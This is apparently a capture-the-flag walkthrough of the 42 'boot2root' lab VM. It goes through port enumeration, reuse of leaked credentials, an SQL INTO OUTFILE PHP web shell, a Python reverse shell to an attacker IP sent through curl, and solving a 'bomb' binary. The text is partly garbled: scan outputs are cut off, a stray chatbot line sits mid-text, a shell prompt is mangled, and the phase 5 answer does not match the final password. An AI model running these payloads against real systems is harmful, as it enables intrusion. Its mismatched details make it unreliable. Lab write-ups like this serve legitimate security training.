## 1. Enumerate Open Ports

First, we start by scanning the target's open ports using **Nmap**.

```bash
xel@lucky7 ~/files/42/boot2root % nmap 192.168.0.31

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-03 12:35 CEST
Nmap scan report for 192.168.0.31
Host is up (0.00066s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

Nmap done: 1 IP address (1 host up) scanned in 0.06 seconds
```

We identify that ports 21 (FTP), 22 (SSH), 80 (HTTP), 143 (IMAP), 443 (HTTPS), and 993 (IMAPS) are open. 

## 2. Perform a Full Version Scan

We now run a full **Nmap** scan with service detection and versioning to get detailed information about each open port.

```bash
xel@lucky7 ~/files/42/boot2root % nmap -T4 -sVC -A -p 21,22,80,143,443,993 192.168.0.31

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-03 12:36 CEST
Nmap scan report for hackme.fr (192.168.0.31)
Host is up (0.00028s latency).

## 3. Directory Fuzzing with FFUF

### HTTP Enumeration

We use **ffuf** to brute-force directories on the HTTP service (port 80):

```bash
xel@lucky7 ~/files/42/boot2root % ffuf -u http://192.168.0.31/FUZZ -w ~/files/pentest/directory-list-medium

        /'___\  /'___\           /'___\

Here, we discovered:
- A **/forum** directory, but it is restricted (403 Forbidden).
- A **/fonts** directory, which redirects (301) elsewhere.
- The **/server-status** endpoint is also forbidden (403).

### HTTPS Enumeration

We repeat the process for the HTTPS service (port 443):

```bash
xel@lucky7 ~/files/42/boot2root % ffuf -u https://192.168.0.31/FUZZ -w ~/files/pentest/directory-list-medium

```

For HTTPS, we find:
- A **/forum** directory, which redirects (301).
- A **/webmail** directory, likely for accessing the mail service.
- A **/phpmyadmin** directory, which could provide access to the database management system (MySQL).

## 4. Web browsing

### Forum
Let's start by exploring the **/forum** directory. While browsing the forum, we notice that the user **lmezard** leaks their password: `!q\]Ej?*5K5cy*AJ`. We attempt to log in with their credentials, and it works.

In their user profile, we find their email: **laurie@borntosec.net**. Aside from this, there doesn't seem to be anything else of interest in the forum.

### Webmail
Navigating to the **/webmail** directory, we are presented with a login interface. We decide to try **lmezard's** email (`laurie@borntosec.net`) and the leaked password, and bingo, it works! 

We found this mail:
```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```

### Database

In the **phpMyAdmin** interface, we find a database containing a table named **userdata**, which holds the forum users and their passwords. Among the users, there is an **admin** account with the following password hash: 
`ed0fd64f25f3bd3a54f8d272ba93b6e76ce7f3d0516d551c28`.

### Crack the Admin Password

Upon examining the forum's source code, we discover that the forum was created using a PHP framework called **mylittleforum** version 2.3.4, which fortunately is open-source.

We look at the source code to find the password hashing algorithm, and hereâ€™s what we find:

```php
function generate_pw_hash($pw)
{
  $salt = random_string(10,'0123456789abcdef');
  $salted_hash = sha1($pw.$salt);
  $hash_with_salt = $salted_hash.$salt;
  return $hash_with_salt;
}
```

The password is hashed with a salt, making it practically uncrackable due to the random string appended to the hash.

## 5. SQL

However, having access to **phpMyAdmin** allows us to execute arbitrary SQL code. We can potentially use this to upload a PHP file that will execute commands on the server.

We try creating a PHP file that can be accessed from the browser and executed. After testing various accessible directories (`/images`, `/themes`, `/includes/`), we find that only the `/templates_c/` directory works.

We run the following SQL query to upload a PHP script into the directory:

```sql
SELECT "<?php system('id'); ?>" INTO OUTFILE '/var/www/forum/templates_c/id.php';
```

Once the file is created, we access it through the browser and successfully execute the **id** command:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirms that we are now running commands as the **www-data** user, which opens up further possibilities for privilege escalation.

## 6. Get a Reverse Shell

### Setting up a webshell

Now, let's set up a **web shell** to gain more control over the target system. We will modify our SQL query to create a simple PHP web shell that can execute system commands:

```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/forum/templates_c/webshell.php';
```

We can now access this web shell by using `curl` to send commands to it:

```bash
xel@lucky7 ~/files/42/boot2root % curl --insecure 'https://192.168.0.31/forum/templates_c/webshell.php?cmd=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirms that our web shell is working and executing commands as the **www-data** user.

### Setting Up a Reverse Shell

Next, we set up a listener on our host machine to catch the reverse shell:

```bash
xel@lucky7 ~/files/42/boot2root % nc -lvnp 4444
Listening on 0.0.0.0 4444
```

To establish a reverse shell on the target, we take a Python reverse shell script from the **[Reverse Shell Cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#python)**. 

```python
export RHOST="192.168.0.24";export RPORT=4444;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

We encode the payload using **CyberChef** with URL encoding, resulting in the following command:

```bash
xel@lucky7 ~/files/42/boot2root % curl --insecure 'https://192.168.0.31/forum/templates_c/webshell.php?cmd=export%20RHOST%3D%22192%2E168%2E0%2E24%22%3Bexport%20RPORT%3D4444%3Bpython%20%2Dc%20%27import%20socket%2Cos%2Cpty%3Bs%3Dsocket%2Esocket%28%29%3Bs%2Econnect%28%28os%2Egetenv%28%22RHOST%22%29%2Cint%28os%2Egetenv%28%22RPORT%22%29%29%29%29%3B%5Bos%2Edup2%28s%2Efileno%28%29%2Cfd%29%20for%20fd%20in%20%280%2C1%2C2%29%5D%3Bpty%2Espawn%28%22%2Fbin%2Fsh%22%29%27'
```

Now, when the reverse shell connects, we receive a connection on our listener:

```bash
xel@lucky7 ~/files/42/boot2root % nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.0.31 50782
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$
```

We now have a reverse shell running as the **www-data** user, giving us command execution on the target system.

## 7. Exploring the Target

While exploring the `/home` directory, we notice a folder named **LOOKATME** owned by the **www-data** user. Inside this directory, we find a file named `password`.

```bash
$ cat password
lmezard:G!@M6f4Eatau{sF"
```

We attempt to use these credentials to connect via **SSH**, but they donâ€™t work. However, when we try logging into **FTP**, it works!

### FTP Access

```bash
xel@lucky7 ~/files/42/boot2root % ftp 192.168.0.31 

Connected to 192.168.0.31.
220 Welcome on this server

```

The **README** file contains a challenge that must be completed to unlock further access:

```bash
xel@lucky7 ~/files/42/boot2root % cat README
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
```

We also download a file named **fun** from the FTP server. Letâ€™s investigate this file further:

```bash
xel@lucky7 ~/files/42/boot2root % file fun 
fun: POSIX tar archive (GNU)
```

The file is a tar archive, so we extract it:

```bash
xel@lucky7 ~/files/42/boot2root % tar -xvf fun
```

The extraction creates a directory named **ft_fun**, containing 750 files.
Each of the 750 files follows a similar structure:

```bash
xel@lucky7 ~/files/42/boot2root/ft_fun % cat 0564G.pcap 
}void useless() {

//file355
```

It becomes apparent that each file contains a small fragment of C code, and they all have comments indicating their position (e.g., `//file355`). Our task is to reconstruct the full C program by piecing together the fragments in the correct order based on these comments.

## 8. Rebuilding the Code

We will now proceed with writing a Python script to automate the extraction and ordering of the code snippets to solve this challenge. 

Hereâ€™s the Python script to automate this process:

```python
import os
import re

directory = "./ft_fun/"
fragments = {}
pattern = re.compile(r'//file(\d+)')

for filename in os.listdir(directory):
    filepath = os.path.join(directory, filename)
    
    with open(filepath, 'r') as file:
        content = file.read()
        match = pattern.search(content)
        if match:
            file_number = int(match.group(1))
            fragments[file_number] = content.strip()

ordered_fragments = dict(sorted(fragments.items()))

with open("main.c", "w") as output_file:
    for _, fragment in ordered_fragments.items():
        output_file.write(fragment + "\n")
```

### Compiling and Running the Code

Once the C code is reconstructed, we can compile and run it to retrieve the final password.

```bash
xel@lucky7 ~/files/42/boot2root/ % gcc main.c
xel@lucky7 ~/files/42/boot2root/ft_fun % ./main.c

MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
```

To complete the challenge, we are asked to hash the password using the **SHA-256** algorithm. We can do this using the following command:

```bash
xel@lucky7 ~/files/42/boot2root/ % echo -n "Iheartpwnage" | sha256sum
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

xel@lucky7 ~/files/42@BornToSecHackMe:~$/boot2root/ % ssh laurie@192.168.0.31
laurie@192.168.0.31's password:

laurie@BornToSecHackMe:~$
```

Hereâ€™s the continuation of your write-up with the section on solving the bomb challenge and gaining access to the `thor` user:

## 9. laurie session

After gaining laurie access, we explore Laurieâ€™s home directory and find two files: **bomb** and **README**.

```bash
laurie@BornToSecHackMe:~$ ls
bomb  README

laurie@BornToSecHackMe:~$ file bomb
bomb: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.0.0, not stripped
```

The **bomb** file is a 32-bit ELF binary, meaning itâ€™s an executable file. Letâ€™s read the **README** for instructions:

```bash
laurie@BornToSecHackMe:~$ cat README 
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```

The **README** gives us a hint about diffusing the bomb and indicates that the password we extract from it should be used to log in as the **thor** user via SSH.

### Reversing the Binary with Binary Ninja

Upon reverse engineering the **bomb** binary with **Binary Ninja**, we find that the program consists of 6 levels. Each level expects a specific string input, which we need to figure out by analyzing the binary. Once all the strings are entered correctly, we will have the complete password to log in as **thor**.

#### Phase 1:
The expected input is a string: `Public speaking is very easy.`

#### Phase 2:
The input is a sequence of factorials: `1 2 6 24 120 720`

#### Phase 3:
The input is a number, a char and another number: `1 b 214`

#### Phase 4:
The correct input is the number `9`.

#### Phase 5:
The input is a string: `opukmq`

#### Phase 6:
The input is a number sequence: `4 2 6 3 1 5`

### Concatenating the Password

To derive the password for the **thor** user, we concatenate the correct strings from all phases, following the hint in the **README** about no spaces in the password:

**Password for thor:**
```
Publicspeakingisveryeasy.126241207201b2149opekmq426135
```

Now that we have the password, we switch to the **thor** user:

```bash
laurie@BornToSecHackMe:~$ su thor
Password: 
thor@BornToSecHackMe:~$
```

We have successfully gained access to the **thor** user!

## 10. thor session
